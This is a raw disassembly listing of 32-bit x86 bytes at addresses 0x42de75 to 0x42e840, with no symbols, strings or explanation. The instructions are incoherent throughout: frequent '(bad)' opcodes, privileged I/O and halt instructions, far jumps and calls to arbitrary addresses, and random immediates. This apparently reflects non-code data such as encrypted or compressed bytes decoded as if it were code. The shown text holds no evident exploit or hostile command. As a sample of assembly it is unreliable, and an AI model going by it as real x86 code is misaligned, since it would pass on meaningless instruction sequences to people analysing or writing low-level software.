  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	mov    eax,ds:0x457fc80b
  42de85:	in     al,dx
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0x81000001
  42de8d:	mov    WORD PTR [ecx],ss
  42de8f:	ss pop ecx
  42de91:	mov    dl,BYTE PTR [esi]
  42de93:	retf   0x1b0e
  42de96:	bound  eax,QWORD PTR gs:[edx+0x2b]
  42de9a:	pop    esi
  42de9b:	or     BYTE PTR [ecx],cl
  42de9d:	cmc    
  42de9e:	leave  
  42de9f:	adc    edi,esi
  42dea1:	jecxz  0x42de3d
  42dea3:	sub    al,0xd
  42dea5:	pop    ebx
  42dea6:	lods   al,BYTE PTR ds:[esi]
  42dea7:	rcr    DWORD PTR [esi+0x23cf4586],1
  42dead:	rcr    DWORD PTR [edi+ebp*4+0x58],1
  42deb1:	pusha  
  42deb2:	js     0x42de65
  42deb4:	fst    QWORD PTR [ebp+0x53]
  42deb7:	out    0x6b,al
  42deb9:	push   es
  42deba:	and    al,0x57
  42debc:	fwait
  42debd:	jne    0x42df15
  42debf:	jle    0x42de7e
  42dec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dec2:	mov    BYTE PTR [ebp-0x586af90b],cl
  42dec8:	pop    eax
  42dec9:	push   cs
  42deca:	loope  0x42def9
  42decc:	hlt    
  42decd:	adc    ch,BYTE PTR [edi-0x245ecd8]
  42ded3:	aaa    
  42ded4:	pop    ebp
  42ded5:	push   ds
  42ded6:	(bad)  
  42ded8:	jo     0x42df4b
  42deda:	stos   BYTE PTR es:[edi],al
  42dedb:	sbb    ch,cl
  42dedd:	imul   edx,ecx,0xee4a6f9c
  42dee3:	daa    
  42dee4:	fdivr  QWORD PTR [edi]
  42dee6:	jno    0x42de82
  42dee8:	daa    
  42dee9:	or     dh,dh
  42deeb:	mov    dh,0x36
  42deed:	xchg   esp,eax
  42deee:	pushf  
  42deef:	gs push 0xffffff98
  42def2:	inc    ebp
  42def3:	sbb    ah,BYTE PTR [edx+0x22]
  42def6:	fdivr  st(7),st
  42def8:	xor    BYTE PTR [eax+ecx*8],ah
  42defb:	scas   al,BYTE PTR es:[edi]
  42defc:	lods   al,BYTE PTR ds:[esi]
  42defd:	mov    ebp,0x89e9ce4e
  42df02:	lahf   
  42df03:	sbb    DWORD PTR [edi+0x18],ebx
  42df06:	xchg   DWORD PTR [edi+0x52],ebx
  42df09:	les    ecx,FWORD PTR [eax+0x71fd15e6]
  42df0f:	mov    bh,0x80
  42df11:	and    al,0x27
  42df13:	or     ecx,DWORD PTR [edi+0x66bc706d]
  42df19:	push   ds
  42df1a:	mov    eax,ds:0x7e5a3e40
  42df1f:	adc    eax,DWORD PTR [ecx]
  42df21:	mov    ah,0x44
  42df23:	repnz fsub DWORD PTR [ebp-0xde1eb4a]
  42df2a:	loopne 0x42df0c
  42df2c:	ins    DWORD PTR es:[edi],dx
  42df2d:	mov    cl,0x50
  42df2f:	xor    al,0x9
  42df31:	pushf  
  42df32:	dec    edi
  42df33:	repz cmp eax,0x919edd91
  42df39:	mov    ah,dl
  42df3b:	enter  0xec6b,0x3f
  42df3f:	dec    edx
  42df40:	sub    DWORD PTR [ebx+0x6aa0aec3],0x69
  42df47:	mov    al,0x7b
  42df49:	hlt    
  42df4a:	inc    ebp
  42df4b:	mov    edx,0xf9345d3e
  42df50:	daa    
  42df51:	or     ecx,ecx
  42df53:	or     eax,0xa9b0a0e
  42df58:	scas   eax,DWORD PTR es:[edi]
  42df59:	sbb    BYTE PTR [esi+ebp*2-0x74],bh
  42df5d:	jmp    0xd179cfa0
  42df62:	or     BYTE PTR [eax-0x3d],al
  42df65:	pop    edi
  42df66:	imul   edi,DWORD PTR [ecx-0x37],0xcda5973c
  42df6d:	pop    ebx
  42df6e:	ds int3 
  42df70:	or     al,0x18
  42df72:	mov    dl,BYTE PTR [esi-0x70]
  42df75:	loopne 0x42df06
  42df77:	jb     0x42dff0
  42df79:	aam    0xba
  42df7b:	xchg   edi,eax
  42df7c:	daa    
  42df7d:	or     DWORD PTR [edi-0x7cbeb09a],esi
  42df83:	cwde   
  42df84:	xchg   ebp,eax
  42df85:	daa    
  42df86:	jmp    0xcd8f:0x771cffec
  42df8d:	test   eax,0xc83374
	...
  42dff2:	add    BYTE PTR [eax],al
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x3e]
  42e001:	cmp    cl,al
  42e003:	(bad)
  42e007:	add    BYTE PTR ds:0x21000001,al
  42e00d:	sub    BYTE PTR [edi],ch
  42e00f:	imul   ecx,DWORD PTR [edx+0x18],0xffffffc5
  42e013:	nop
  42e014:	cmp    BYTE PTR [ecx-0x6f],al
  42e017:	inc    ecx
  42e018:	pop    ebp
  42e019:	psubb  mm3,QWORD PTR [esi+0x27]
  42e01d:	ret    0x6013
  42e020:	sti    
  42e021:	xchg   edx,eax
  42e022:	or     BYTE PTR [edi+0x1fd6a402],cl
  42e028:	xor    cl,BYTE PTR [edi-0x7c]
  42e02b:	es jecxz 0x42e081
  42e02e:	dec    edx
  42e02f:	and    BYTE PTR [esi+0x60],0x20
  42e033:	ror    DWORD PTR [ecx-0x25],1
  42e036:	shl    bh,0x7a
  42e039:	push   ebx
  42e03a:	or     dl,BYTE PTR [edx+0x53ae3955]
  42e040:	out    dx,eax
  42e041:	inc    ebx
  42e042:	test   ch,ah
  42e044:	mov    BYTE PTR [edx+0x5304911b],dl
  42e04a:	add    edi,DWORD PTR [ebx]
  42e04c:	jecxz  0x42e0cb
  42e04e:	sbb    al,0x41
  42e050:	mov    bl,BYTE PTR [esi+0x6a]
  42e053:	fsub   QWORD PTR [edi-0x2b8b470a]
  42e059:	mov    eax,ds:0x80557df
  42e05e:	frstor [ebx]
  42e060:	jle    0x42e058
  42e062:	mov    dh,0x60
  42e064:	push   0x1e
  42e066:	shr    BYTE PTR ds:0x5463da05,0x5a
  42e06d:	push   0xfffffff9
  42e06f:	(bad)  
  42e070:	daa    
  42e071:	xchg   ebx,eax
  42e072:	(bad)  
  42e073:	les    esp,FWORD PTR [ecx+0x6ede6e77]
  42e079:	mov    esp,0x5280dbd6
  42e07e:	mov    dh,BYTE PTR [ecx-0x1e]
  42e081:	aaa    
  42e082:	lds    esi,FWORD PTR [ecx-0xb]
  42e085:	jmp    0x4bccc369
  42e08a:	sbb    eax,0x5132e6fd
  42e08f:	lods   eax,DWORD PTR ds:[esi]
  42e090:	xchg   ecx,eax
  42e091:	mov    ebx,0xe8e21d18
  42e096:	sbb    eax,0xabd215b8
  42e09b:	xlat   BYTE PTR ds:[ebx]
  42e09c:	ins    BYTE PTR es:[edi],dx
  42e09d:	ret    0x816a
  42e0a0:	es dec esi
  42e0a2:	jle    0x42e066
  42e0a4:	adc    eax,0x8b7bcd7
  42e0a9:	mov    cl,0xbf
  42e0ab:	call   0xb7e8:0xe6c43321
  42e0b2:	jnp    0x42e0f7
  42e0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e0b5:	sbb    eax,0x7575bad5
  42e0ba:	jle    0x42e119
  42e0bc:	sub    BYTE PTR [ebx],ch
  42e0be:	xlat   BYTE PTR ds:[ebx]
  42e0bf:	cmp    al,0x86
  42e0c1:	inc    ebp
  42e0c2:	add    al,0xcd
  42e0c4:	xchg   DWORD PTR ss:[esi+0x19],edx
  42e0c8:	jl     0x42e0f8
  42e0ca:	std    
  42e0cb:	outs   dx,BYTE PTR ds:[esi]
  42e0cc:	loope  0x42e0ce
  42e0ce:	rcl    DWORD PTR [eax],cl
  42e0d0:	stos   DWORD PTR es:[edi],eax
  42e0d1:	push   0x41
  42e0d3:	out    0x4c,eax
  42e0d5:	fimul  DWORD PTR [ebp+0x5c26bc03]
  42e0db:	jns    0x42e07d
  42e0dd:	cmp    DWORD PTR [ecx-0x29ad6f12],ebx
  42e0e3:	jmp    0x2c7a7efd
  42e0e8:	enter  0x91b2,0xb6
  42e0ec:	sub    ebx,DWORD PTR [esi]
  42e0ee:	nop
  42e0ef:	mov    ebx,0x9e3d25d0
  42e0f4:	or     al,BYTE PTR [eax+0x43]
  42e0f7:	sbb    bl,cl
  42e0f9:	cli    
  42e0fa:	push   esi
  42e0fb:	in     al,0x15
  42e0fd:	into   
  42e0fe:	bnd je 0x42e14c
  42e101:	cmp    BYTE PTR [ebx+0x4e29255f],dl
  42e107:	(bad)
  42e10b:	mov    ds:0x8e077a13,eax
  42e110:	je     0x42e112
	...
  42e172:	add    BYTE PTR [eax],al
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	idiv   BYTE PTR [ecx+0x44]
  42e183:	loope  0x42e1d4
  42e185:	out    dx,al
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    eax,0xc9000001
  42e18d:	loope  0x42e163
  42e18f:	xor    ah,BYTE PTR [edx+0x13756bca]
  42e195:	ror    BYTE PTR [ebx-0x4c],cl
  42e198:	daa    
  42e199:	out    0x7,eax
  42e19b:	cld    
  42e19c:	push   eax
  42e19d:	adc    eax,0xa5ee66d0
  42e1a2:	inc    esp
  42e1a3:	fcom   DWORD PTR [edi+0x26ccd7d6]
  42e1a9:	jp     0x42e15b
  42e1ab:	stos   BYTE PTR es:[edi],al
  42e1ac:	pop    ss
  42e1ad:	in     al,dx
  42e1ae:	sub    al,0x17
  42e1b0:	lock in eax,0x31
  42e1b3:	aad    0x23
  42e1b5:	shl    DWORD PTR [ebp+0x5a],1
  42e1b8:	inc    esi
  42e1b9:	sbb    dl,BYTE PTR [eax+0x6eff459f]
  42e1bf:	pushf  
  42e1c0:	aam    0xd2
  42e1c2:	push   ecx
  42e1c3:	jbe    0x42e186
  42e1c5:	idiv   DWORD PTR [ebx-0x1a]
  42e1c8:	inc    ebp
  42e1c9:	mov    gs:0xdf4710f9,al
  42e1cf:	add    DWORD PTR [esi],ebx
  42e1d1:	pop    edi
  42e1d2:	ficom  WORD PTR [eax+0x7a]
  42e1d5:	sbb    DWORD PTR [edi+0x6f],0xffffffff
  42e1d9:	ja     0x42e17e
  42e1db:	inc    esi
  42e1dc:	(bad)  
  42e1dd:	fdivr  QWORD PTR [edx]
  42e1df:	mov    al,0x25
  42e1e1:	adc    edi,DWORD PTR [eax]
  42e1e3:	cmp    BYTE PTR [esi+0x5fa1fe7e],bh
  42e1e9:	add    DWORD PTR [edi],0x74
  42e1ec:	push   cs
  42e1ed:	xor    DWORD PTR [ebx],ecx
  42e1ef:	ins    BYTE PTR es:[edi],dx
  42e1f0:	mov    bh,0x3c
  42e1f2:	mov    eax,0x28f5ade6
  42e1f7:	ja     0x42e18d
  42e1f9:	push   esp
  42e1fa:	out    dx,eax
  42e1fb:	fimul  DWORD PTR [edi+0x0]
  42e1fe:	jge    0x42e183
  42e200:	ss ret 
  42e202:	sub    al,0x2e
  42e204:	jl     0x42e220
  42e206:	(bad)  
  42e207:	sub    BYTE PTR [ecx],dl
  42e209:	fcomp  DWORD PTR [ecx+0x6]
  42e20c:	mov    cl,0x8c
  42e20e:	xor    cl,bh
  42e210:	push   eax
  42e211:	cmp    eax,0x90b4ff04
  42e216:	add    ecx,DWORD PTR [edx+0x846329e]
  42e21c:	push   edi
  42e21d:	jb     0x42e1e2
  42e21f:	add    al,0xc1
  42e221:	cmp    BYTE PTR [ecx+0x1bd36d2b],0x43
  42e228:	int    0xd
  42e22a:	jle    0x42e20d
  42e22c:	push   ss
  42e22d:	inc    edi
  42e22e:	fmul   DWORD PTR [eax-0x48]
  42e231:	mov    ecx,DWORD PTR [ecx]
  42e233:	jnp    0x42e264
  42e235:	mov    dl,0x3a
  42e237:	xchg   ecx,eax
  42e238:	sahf   
  42e239:	shl    BYTE PTR [edx],1
  42e23b:	call   0x3ad8:0x3bee5844
  42e242:	not    BYTE PTR [eax-0x2ff69920]
  42e248:	push   0xc3667212
  42e24d:	sbb    BYTE PTR [edx-0x3bee4926],dh
  42e253:	or     BYTE PTR [ebp-0x347081b2],0x77
  42e25a:	sub    BYTE PTR [esi-0x776e8472],bh
  42e260:	mov    eax,ds:0x76ec499a
  42e265:	(bad)  
  42e266:	fistp  WORD PTR [esi-0x5]
  42e269:	aad    0x9f
  42e26b:	es xchg edi,eax
  42e26d:	sbb    DWORD PTR [edx+0x45ad15d1],ebp
  42e273:	mov    ah,0x2d
  42e275:	in     al,dx
  42e276:	mul    BYTE PTR [edx*1+0x172bede8]
  42e27d:	sbb    DWORD PTR [edi+0x3c],esp
  42e280:	mov    eax,ds:0x479cbc29
  42e285:	add    al,0x73
  42e287:	fidivr WORD PTR [esi+0x7]
  42e28a:	outs   dx,DWORD PTR ds:[esi]
  42e28b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e28c:	inc    esi
  42e28d:	ins    DWORD PTR es:[edi],dx
  42e28e:	(bad)  
  42e28f:	pop    eax
  42e290:	mov    eax,ds:0x0
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x8199140
  42e301:	call   0xef975415
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    eax,0x29000001
  42e30d:	mov    ch,0x71
  42e30f:	sti    
  42e310:	and    eax,0x16ff8963
  42e315:	(bad)  
  42e316:	sub    ebp,eax
  42e318:	sbb    al,BYTE PTR [ecx-0x18]
  42e31b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e31c:	sbb    ch,BYTE PTR [ebx+0x5ff5baf3]
  42e322:	and    eax,0x90ab3099
  42e327:	cmp    al,0x51
  42e329:	and    ah,BYTE PTR [edi+0x6f59fbe1]
  42e32f:	mov    ds:0x526fcc7f,al
  42e334:	call   0xface:0x2a9c3a2c
  42e33b:	fcomp  DWORD PTR [eax-0x35066efa]
  42e341:	fnstsw WORD PTR [ebx-0x32d5a2d]
  42e347:	(bad)  
  42e348:	hlt    
  42e349:	pop    edx
  42e34a:	call   0x6465:0x9ee60122
  42e351:	pop    eax
  42e352:	std    
  42e353:	dec    eax
  42e354:	out    dx,eax
  42e355:	pop    ebp
  42e356:	inc    ecx
  42e357:	pop    ebp
  42e358:	pop    esi
  42e359:	(bad)  
  42e35a:	push   0x2c
  42e35c:	pop    ds
  42e35d:	aam    0xeb
  42e35f:	dec    ebp
  42e360:	dec    ebx
  42e361:	xor    DWORD PTR [ebp+0x7be63bb6],ecx
  42e367:	dec    eax
  42e368:	psubsb mm7,QWORD PTR [edx+0x29]
  42e36c:	int3   
  42e36d:	jle    0x42e302
  42e36f:	dec    ebp
  42e370:	fnsave [edx]
  42e372:	pop    ds
  42e373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e374:	fucomip st,st(0)
  42e376:	and    eax,0x1501db72
  42e37c:	jo     0x42e3db
  42e37e:	loop   0x42e345
  42e380:	jne    0x42e362
  42e382:	in     eax,dx
  42e383:	es das 
  42e385:	sub    ebx,DWORD PTR [eax]
  42e387:	sbb    BYTE PTR [edx],al
  42e389:	dec    ecx
  42e38a:	mov    cl,0x4d
  42e38c:	outs   dx,DWORD PTR ds:[esi]
  42e38d:	(bad)
  42e391:	push   0x33ea73a1
  42e396:	push   eax
  42e397:	mov    ch,0x3e
  42e399:	adc    bh,BYTE PTR [eax+0x142dda7d]
  42e39f:	popa   
  42e3a0:	sub    eax,0x76faa0e8
  42e3a5:	aaa    
  42e3a6:	pop    esi
  42e3a7:	jmp    0x42e3c6
  42e3a9:	aaa    
  42e3aa:	pusha  
  42e3ab:	call   0x9563:0x52667a9
  42e3b2:	out    dx,eax
  42e3b3:	and    esp,eax
  42e3b5:	sti    
  42e3b6:	sbb    al,0x60
  42e3b8:	out    dx,al
  42e3b9:	stos   DWORD PTR es:[edi],eax
  42e3ba:	xchg   ecx,eax
  42e3bb:	gs je  0x42e3d0
  42e3be:	inc    edx
  42e3bf:	mov    dl,0xb0
  42e3c1:	out    dx,eax
  42e3c2:	ret    0x4d0f
  42e3c5:	push   edi
  42e3c6:	lods   al,BYTE PTR ds:[esi]
  42e3c7:	xchg   ebx,eax
  42e3c8:	mov    esp,0x20864d43
  42e3cd:	pop    eax
  42e3ce:	inc    edx
  42e3cf:	sub    al,0xfb
  42e3d1:	mov    edx,0xf66087af
  42e3d6:	push   es
  42e3d7:	idiv   DWORD PTR [edx+0x5f867e21]
  42e3dd:	xor    BYTE PTR [ebp+0x11],ch
  42e3e0:	sub    eax,0x2447da15
  42e3e5:	pop    esp
  42e3e6:	mov    es,WORD PTR [eax+0x6eb00e38]
  42e3ec:	repz (bad) 
  42e3ee:	sub    eax,0xec7c8251
  42e3f3:	cld    
  42e3f4:	test   eax,edi
  42e3f6:	cwde   
  42e3f7:	pop    esi
  42e3f8:	push   ebx
  42e3f9:	add    eax,0xc9ccfe64
  42e3fe:	sbb    DWORD PTR [ecx+ebx*8],ebx
  42e401:	pop    es
  42e402:	aad    0x6a
  42e404:	outs   dx,BYTE PTR ds:[esi]
  42e405:	mov    WORD PTR [ecx+0x72df1558],es
  42e40b:	pop    ebp
  42e40c:	ficomp WORD PTR [ebp-0x76]
  42e40f:	cmp    al,0xc3
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	and    al,0x40
  42e482:	xor    eax,0x1f05974
  42e487:	add    BYTE PTR ds:0xd8000001,al
  42e48d:	mov    dl,BYTE PTR [eax+0x3ba6d83c]
  42e493:	pop    DWORD PTR [esp+eiz*4-0x74f2aa40]
  42e49a:	aad    0x68
  42e49c:	xor    DWORD PTR [edx-0x44b5170f],esi
  42e4a2:	test   al,0x79
  42e4a4:	daa    
  42e4a5:	pop    ecx
  42e4a6:	lock mov eax,ds:0x45b5b16b
  42e4ac:	test   BYTE PTR [ecx-0x3bf76dc5],bl
  42e4b2:	pop    ecx
  42e4b3:	xchg   edi,eax
  42e4b4:	or     esp,edx
  42e4b6:	push   ecx
  42e4b7:	sub    al,0xe5
  42e4b9:	repnz push ss
  42e4bb:	push   esi
  42e4bc:	adc    eax,0xf03386af
  42e4c1:	and    BYTE PTR [edx-0x32aa7eff],ch
  42e4c7:	into   
  42e4c8:	(bad)  
  42e4c9:	xor    eax,DWORD PTR [eax]
  42e4cb:	in     al,dx
  42e4cc:	pop    edi
  42e4cd:	xchg   BYTE PTR [esi+0x46c92ed3],bl
  42e4d3:	test   DWORD PTR [ebx],esp
  42e4d5:	(bad)  
  42e4d6:	fsub   DWORD PTR [esp+ebx*8]
  42e4d9:	mov    edx,0x3d612f8f
  42e4de:	xchg   DWORD PTR [ebp-0x5d],ebx
  42e4e1:	push   ss
  42e4e2:	push   ds
  42e4e3:	push   esi
  42e4e4:	mov    eax,ds:0x651d2231
  42e4e9:	mov    eax,0x466b8744
  42e4ee:	and    esp,0x8ab7b772
  42e4f4:	inc    ebp
  42e4f5:	jg     0x42e4de
  42e4f7:	(bad)  
  42e4f8:	jecxz  0x42e55b
  42e4fa:	outs   dx,DWORD PTR ds:[esi]
  42e4fb:	(bad)  
  42e4fc:	test   DWORD PTR [eax],esi
  42e4fe:	outs   dx,BYTE PTR ds:[esi]
  42e4ff:	jo     0x42e4cc
  42e501:	cwde   
  42e502:	lods   eax,DWORD PTR ds:[esi]
  42e503:	xchg   esi,eax
  42e504:	or     eax,0xc894f5dd
  42e509:	add    ecx,DWORD PTR [ebx]
  42e50b:	rol    BYTE PTR [ecx],0x51
  42e50e:	hlt    
  42e50f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e510:	mov    esp,0xf3c9eee1
  42e515:	xchg   ebp,eax
  42e516:	cmp    DWORD PTR [edi-0x53],0xe524af4e
  42e51d:	push   esp
  42e51e:	or     edx,edx
  42e520:	mov    esp,0x34089e2a
  42e525:	(bad)
  42e52a:	sar    DWORD PTR [edi-0x7a],0xc3
  42e52e:	in     al,0x39
  42e530:	adc    eax,0xc6595011
  42e535:	mov    ds:0x4607405,eax
  42e53a:	and    al,0x4f
  42e53c:	cmp    al,0x29
  42e53e:	fwait
  42e53f:	sbb    ebp,DWORD PTR [eax+esi*8+0x3648d989]
  42e546:	push   es
  42e547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e548:	fnstenv [ecx+0x15]
  42e54b:	stos   DWORD PTR es:[edi],eax
  42e54c:	std    
  42e54d:	dec    esp
  42e54e:	jg     0x42e568
  42e550:	nop
  42e551:	adc    BYTE PTR [ebx+0x4b2a33a5],ch
  42e557:	add    bh,BYTE PTR [ebx-0x7791fc48]
  42e55d:	int3   
  42e55e:	xchg   esp,eax
  42e55f:	and    al,0x97
  42e561:	push   ds
  42e562:	add    esp,DWORD PTR [eax]
  42e564:	jl     0x42e505
  42e566:	inc    edx
  42e567:	inc    edx
  42e568:	mov    dl,0x18
  42e56a:	push   ss
  42e56b:	scas   al,BYTE PTR es:[edi]
  42e56c:	adc    DWORD PTR [edi],ebx
  42e56e:	jle    0x42e5cd
  42e570:	push   ebp
  42e571:	jmp    0xb7ff:0x15f03d13
  42e578:	fs dec esi
  42e57a:	push   esi
  42e57b:	xor    esp,ebx
  42e57d:	dec    eax
  42e57e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e57f:	or     bh,BYTE PTR [edi]
  42e581:	sub    BYTE PTR [edi],bl
  42e583:	imul   ebp,DWORD PTR [esi],0x9b229eca
  42e589:	mov    DWORD PTR [eax+0x10],edx
  42e58c:	mov    dh,cl
  42e58e:	aaa    
  42e58f:	loopne 0x42e60d
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	inc    ebp
  42e601:	jge    0x42e617
  42e603:	inc    ebx
  42e604:	pop    esi
  42e605:	icebp  
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    eax,0x77000001
  42e60d:	and    BYTE PTR [eax],al
  42e60f:	js     0x42e687
  42e611:	mov    ebp,0x44d10ab1
  42e616:	mov    dh,0xc1
  42e618:	fisub  DWORD PTR [ebx]
  42e61a:	ds pop edi
  42e61c:	test   eax,0x6aabc57
  42e621:	js     0x42e645
  42e623:	jnp    0x42e670
  42e625:	imul   bl
  42e627:	sub    bh,BYTE PTR [ecx-0x4c]
  42e62a:	push   0xb20c8e79
  42e62f:	lods   eax,DWORD PTR ds:[esi]
  42e630:	std    
  42e631:	mov    bh,BYTE PTR [eax-0x44]
  42e634:	(bad)  
  42e635:	push   ss
  42e636:	test   DWORD PTR [ecx-0x1be93075],ebx
  42e63c:	iret   
  42e63d:	jb     0x42e669
  42e63f:	jge    0x42e67d
  42e641:	(bad)
  42e646:	ror    cl,0xd5
  42e649:	js     0x42e606
  42e64b:	xor    ecx,ebx
  42e64d:	shl    DWORD PTR ds:0x30ee9518,1
  42e653:	jle    0x42e639
  42e655:	or     eax,0x86600d34
  42e65a:	sti    
  42e65b:	or     ebx,ecx
  42e65d:	jge    0x42e656
  42e65f:	push   edx
  42e660:	jp     0x42e65a
  42e662:	mov    DWORD PTR [edi+0x54],0xb29c296b
  42e669:	mov    ds:0x4f000fc8,eax
  42e66e:	ins    DWORD PTR es:[edi],dx
  42e66f:	mov    cl,0xe1
  42e671:	mov    ds:0xdfa7d99c,al
  42e676:	shr    DWORD PTR [ebp-0x72],cl
  42e679:	mov    al,ds:0x80ba2e43
  42e67e:	add    DWORD PTR [esi-0x14b78919],eax
  42e684:	scas   eax,DWORD PTR es:[edi]
  42e685:	sbb    eax,0xdb1e8b28
  42e68a:	clc    
  42e68b:	and    esi,esp
  42e68d:	pop    ebx
  42e68e:	aaa    
  42e68f:	inc    edi
  42e690:	mov    DWORD PTR [ebx-0x37],edi
  42e693:	hlt    
  42e694:	ror    DWORD PTR [eax+0xcc23fc0],1
  42e69a:	cmp    BYTE PTR [ecx],bl
  42e69c:	not    DWORD PTR [ecx]
  42e69e:	mov    edx,0x9152be0d
  42e6a3:	sbb    bh,BYTE PTR [ecx+0x6e]
  42e6a6:	and    al,0xdb
  42e6a8:	imul   esi,DWORD PTR [esi-0x3e],0x3c
  42e6ac:	push   es
  42e6ad:	bound  ebx,QWORD PTR [esi+0x28]
  42e6b0:	(bad)  
  42e6b1:	fst    DWORD PTR [eax+0x3b]
  42e6b4:	push   ebp
  42e6b5:	shl    BYTE PTR [ebp+0x23],1
  42e6b8:	cmc    
  42e6b9:	dec    edx
  42e6ba:	retf   0xa6de
  42e6bd:	push   esp
  42e6be:	lds    ecx,FWORD PTR [ebp+0x37]
  42e6c1:	fcmovu st,st(5)
  42e6c3:	ins    BYTE PTR es:[edi],dx
  42e6c4:	aas    
  42e6c5:	retf   0xf255
  42e6c8:	push   esi
  42e6c9:	test   BYTE PTR [edi+0x42],dl
  42e6cc:	inc    ecx
  42e6cd:	(bad)  
  42e6ce:	and    dl,BYTE PTR [esi+0x30ff10d5]
  42e6d4:	imul   BYTE PTR [edi]
  42e6d6:	add    BYTE PTR [ecx+0x74d7978d],ch
  42e6dc:	pop    ss
  42e6dd:	dec    ebp
  42e6de:	test   eax,0xf1f595ce
  42e6e3:	inc    edi
  42e6e4:	stos   DWORD PTR es:[edi],eax
  42e6e5:	inc    edx
  42e6e6:	cwde   
  42e6e7:	cmp    eax,0x3c12d296
  42e6ec:	xchg   edi,eax
  42e6ed:	scas   al,BYTE PTR es:[edi]
  42e6ee:	aas    
  42e6ef:	leave  
  42e6f0:	or     eax,0x6fc9c8d5
  42e6f5:	in     al,dx
  42e6f6:	xchg   esi,eax
  42e6f7:	fldenv fs:[ebx-0x1c]
  42e6fb:	js     0x42e6f6
  42e6fd:	sti    
  42e6fe:	(bad)  
  42e6ff:	out    dx,al
  42e700:	arpl   dx,ax
  42e702:	lods   al,BYTE PTR ds:[esi]
  42e703:	xchg   ecx,eax
  42e704:	add    BYTE PTR [edi-0x4775cce6],cl
  42e70a:	sbb    ebp,DWORD PTR [eax+eax*2+0x5f80c033]
	...
  42e771:	add    BYTE PTR [eax],al
  42e773:	add    BYTE PTR [edx+0x39],bl
  42e776:	dec    esi
  42e777:	sub    eax,0x7f7b7f6f
  42e77c:	sub    BYTE PTR fs:[esi],cl
  42e77f:	fimul  DWORD PTR [ecx-0x7f]
  42e782:	push   ds
  42e783:	xor    ah,BYTE PTR [ebx-0xe]
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    eax,0xac000001
  42e78d:	cdq    
  42e78e:	fwait
  42e78f:	jl     0x42e72a
  42e791:	ret    
  42e792:	stos   BYTE PTR es:[edi],al
  42e793:	mov    al,ds:0x4b6b1904
  42e798:	cld    
  42e799:	imul   eax,DWORD PTR [edx+0x2540a554],0xdd8865c4
  42e7a3:	inc    edx
  42e7a4:	aad    0x1f
  42e7a6:	loope  0x42e80e
  42e7a8:	xchg   BYTE PTR [ebx-0x14],al
  42e7ab:	adc    eax,0xf6e6eb6b
  42e7b0:	fwait
  42e7b1:	stos   DWORD PTR es:[edi],eax
  42e7b2:	or     eax,0x63a74bb0
  42e7b7:	sti    
  42e7b8:	jmp    0x3389:0xccf0eb64
  42e7bf:	mov    ecx,ecx
  42e7c1:	mov    edx,fs
  42e7c3:	sbb    eax,0xff56236
  42e7c8:	mov    ds:0x8b35a367,eax
  42e7cd:	shl    al,cl
  42e7cf:	mov    esi,0x49295d1f
  42e7d4:	pop    edx
  42e7d5:	adc    DWORD PTR [esi],esp
  42e7d7:	fcomp  DWORD PTR [eax-0x7174eb01]
  42e7dd:	mov    edi,0x6eada75
  42e7e2:	inc    ebp
  42e7e3:	mov    ecx,0x7721e93b
  42e7e8:	in     al,dx
  42e7e9:	jae    0x42e7e5
  42e7eb:	ins    BYTE PTR es:[edi],dx
  42e7ec:	call   0x5d12eaa9
  42e7f1:	cmp    esi,DWORD PTR [eax]
  42e7f3:	loopne 0x42e7ed
  42e7f5:	les    ebx,FWORD PTR [edi]
  42e7f7:	test   DWORD PTR [esi],0x2af496d5
  42e7fd:	ret    0x36e0
  42e800:	addr16 sbb dh,0x45
  42e804:	dec    esp
  42e805:	(bad)  [edx+ebp*8-0x5b]
  42e809:	into   
  42e80a:	inc    esi
  42e80b:	dec    edx
  42e80c:	cld    
  42e80d:	xor    al,0xa6
  42e80f:	jge    0x42e7c7
  42e811:	sbb    BYTE PTR [eax+0x59fc2faf],0xbf
  42e818:	pushf  
  42e819:	mov    bl,0x4
  42e81b:	in     al,0xaf
  42e81d:	sbb    BYTE PTR [eax-0x1fe70e1b],0x8a
  42e824:	out    dx,al
  42e825:	inc    esi
  42e826:	aaa    
  42e827:	and    eax,esp
  42e829:	cdq    
  42e82a:	sub    DWORD PTR [esi],edi
  42e82c:	ror    BYTE PTR [eax-0x52],1
  42e82f:	pop    ebp
  42e830:	hlt    
  42e831:	adc    al,0x75
  42e833:	adc    al,0x76
  42e835:	mov    ds:0x4b7b8126,eax
  42e83a:	pop    es
  42e83b:	ret    
  42e83c:	gs sahf 
  42e83e:	ins    DWORD PTR es:[edi],dx
  42e83f:	inc    ebx
  42e840:	scas   eax,DWORD PTR es:[edi]
